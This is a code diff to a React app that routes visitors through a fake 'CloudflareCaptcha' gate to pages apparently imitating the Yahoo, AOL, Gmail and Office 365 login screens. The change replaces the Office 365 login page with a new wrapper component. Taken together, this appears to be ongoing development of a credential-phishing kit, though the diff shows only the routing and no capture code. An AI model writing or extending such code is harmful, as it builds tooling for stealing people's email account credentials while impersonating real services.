@@ -5,7 +5,7 @@ import YahooLoginPage from './components/YahooLoginPage';
 import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
 import AolLoginPage from './components/AolLoginPage';
 import GmailLoginPage from './components/GmailLoginPage';
-import Office365LoginPage from './components/Office365LoginPage';
+import Office365Wrapper from './components/Office365Wrapper'; // Import the new wrapper
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -38,7 +38,7 @@ function App() {
   const [showYahooLogin, setShowYahooLogin] = useState(false);
   const [showAolLogin, setShowAolLogin] = useState(false);
   const [showGmailLogin, setShowGmailLogin] = useState(false);
-  const [showOffice365Login, setShowOffice365Login] = useState(false);
+  const [showOffice365Login, setShowOffice365Login] = useState(false); // ADD NEW STATE
 
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
@@ -55,7 +55,7 @@ function App() {
         setShowYahooLogin(false);
         setShowAolLogin(false);
         setShowGmailLogin(false);
-        setShowOffice365Login(false);
+        setShowOffice365Login(false); // Reset Office state
         if (isActive) setCurrentPage('landing');
         else {
           setCaptchaVerified(false);
@@ -117,7 +117,7 @@ function App() {
     setShowYahooLogin(false);
     setShowAolLogin(false);
     setShowGmailLogin(false);
-    setShowOffice365Login(false);
+    setShowOffice365Login(false); // Reset Office state
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -131,14 +131,14 @@ function App() {
     setShowYahooLogin(false);
     setShowAolLogin(false);
     setShowGmailLogin(false);
-    setShowOffice365Login(false);
+    setShowOffice365Login(false); // Reset Office state
     setCurrentPage('captcha');
   };
 
   const handleYahooSelect = () => setShowYahooLogin(true);
   const handleAolSelect = () => setShowAolLogin(true);
   const handleGmailSelect = () => setShowGmailLogin(true);
-  const handleOffice365Select = () => setShowOffice365Login(true);
+  const handleOffice365Select = () => setShowOffice365Login(true); // ADD NEW HANDLER
 
   if (isLoading) {
     return (
@@ -163,8 +163,8 @@ function App() {
     if (showGmailLogin) {
       return <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
-    if (showOffice365Login) {
-      return <Office365LoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
+    if (showOffice365Login) { // ADD RENDER LOGIC FOR WRAPPER
+      return <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
     }
     
     const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
@@ -174,7 +174,7 @@ function App() {
         onYahooSelect={handleYahooSelect}
         onAolSelect={handleAolSelect}
         onGmailSelect={handleGmailSelect}
-        onOffice365Select={handleOffice365Select}
+        onOffice365Select={handleOffice365Select} // PASS NEW HANDLER
         onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
